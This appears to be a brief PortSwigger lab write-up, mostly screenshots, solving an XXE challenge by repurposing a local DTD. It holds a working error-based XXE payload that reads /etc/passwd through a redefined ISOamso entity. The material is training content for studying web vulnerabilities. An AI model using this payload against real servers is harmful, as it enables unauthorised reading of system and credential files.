## Lab Description: Exploiting XXE to retrieve data by repurposing a local DTD

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/f0ebc6b0-3e71-46e7-99cb-317d55cb3905)

## Solution:

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/ebd5a051-7380-4c59-82a4-990f97400a5c)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/4e63a045-e878-4951-b8d6-cea551c9a61d)

We have to add in our exixting xml request

```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/17d435dd-432f-4a0f-9ac0-2e73680dd668)

Send the request 

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/0cca88e0-dee5-483c-b22e-adae8cacbeb2)

Lab we solved

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/46ef95c6-5ba7-40aa-ab1d-229051efcfdd)

